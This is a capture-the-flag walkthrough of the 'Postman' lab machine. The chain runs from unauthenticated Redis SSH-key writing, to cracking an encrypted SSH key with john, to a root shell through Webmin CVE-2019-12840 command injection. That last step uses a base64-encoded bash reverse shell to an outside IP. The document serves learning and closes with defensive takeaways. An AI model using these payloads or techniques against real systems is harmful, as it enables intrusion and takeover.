Reconnaissance

Two high-value targets: Redis 4.0.9 on 6379 (likely unauthenticated) and Webmin 1.910 on 10000 (has known RCE).

Phase 1

Initial Access — Redis Unauthenticated SSH Key Write

Confirm Unauthenticated Access

$ redis-cli -h 10.129.2.1 -p 6379
10.129.2.1:6379> config get dir
1) "dir"
2) "/var/lib/redis"
Redis unauthorized file write — how it works Redis can dump its in-memory data to disk. Both the directory and filename of the dump are configurable via config set dir and config set dbfilename. By storing an SSH public key as a Redis value, then pointing the dump path to /var/lib/redis/.ssh/authorized_keys and triggering save, the key gets written to the redis user's SSH auth file. Since /var/lib/redis is the redis user's home directory, we can now SSH in as redis.

Write SSH Public Key

# Generate key pair
$ ssh-keygen -t rsa -b 2048  # press Enter through all prompts

# Pad with newlines to avoid corrupting existing data
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt

# Store the key in Redis
$ cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key

# Point the dump file to redis user's authorized_keys
$ redis-cli -h 10.129.2.1 -p 6379
10.129.2.1:6379> config set dir /var/lib/redis/.ssh
OK
10.129.2.1:6379> config set dbfilename authorized_keys
OK
10.129.2.1:6379> save
OK

# SSH in as redis
$ ssh redis@10.129.2.1
redis@Postman:~$
Phase 2

Lateral Movement — Crack Encrypted SSH Key → Matt

Find the Backup Private Key

redis@Postman:~$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
...

Proc-Type: 4,ENCRYPTED means the private key is protected by a passphrase. We need to crack it.

Crack the Passphrase

# Convert to john-compatible format
$ ssh2john id_rsa.bak > matt.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash
computer2008     (rsak)

su to Matt

SSH with the key fails — use su instead Trying ssh -i id_rsa.bak Matt@10.129.2.1 results in Connection closed — the server rejects key-based auth for Matt. But the passphrase is reused as Matt's system password, so su works. Also note: the username is Matt with a capital M. 
redis@Postman:~$ su Matt
Password: computer2008

Matt@Postman:~$ cat user.txt
417e337d1d6d8cd52fad6cac33972405
Phase 3

Privilege Escalation — Webmin 1.910 Authenticated RCE (CVE-2019-12840)

Webmin 1.910 on port 10000 accepts Matt:computer2008 for login.

CVE-2019-12840 — Webmin package update command injection Webmin 1.910's "Software Package Updates" feature has a command injection in the u parameter. The update request passes package names to a shell command without sanitization. Since Webmin runs as root, injected commands execute with full privileges.

Exploit via Burp

Navigate to System → Software Package Updates, select any package, click Update. Intercept with Burp and modify the POST body:

# First verify command execution
u=acl%2Fapt&u=$(whoami)

# Generate base64 reverse shell payload
$ echo -n 'bash -i >& /dev/tcp/10.10.15.65/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42NS80NDQ0IDA+JjE=

# Final payload — ${IFS} replaces spaces (URL-encoded)
u=acl%2Fapt&u=$(echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42NS80NDQ0IDA+JjE=|base64${IFS}-d|bash)
$ nc -lnvp 4444
root@Postman:~# cat /root/root.txt
97ea0f1874e8e65540d64f4817e1f425
Appendix

Key Takeaways

Redis without authentication = arbitrary file write.

config set dir + config set dbfilename + save lets you write any content to any path the Redis process can access. Always set requirepass and bind to 127.0.0.1.

Encrypted SSH keys with weak passphrases are crackable.

ssh2john + john with rockyou cracked computer2008 in seconds. Use strong passphrases and don't leave backup keys in world-readable directories.

Passphrase reuse as system password is a common lateral move.

When direct SSH with a cracked key fails, try su with the passphrase — developers often reuse the same password everywhere.

Webmin running as root is a high-value target.

CVE-2019-12840's u parameter injection gives instant root. Use ${IFS} to replace spaces and base64 encoding for complex payloads.

Case-sensitive usernames matter on Linux.

Matt ≠ matt. Always check /etc/passwd for the exact username before su or SSH.
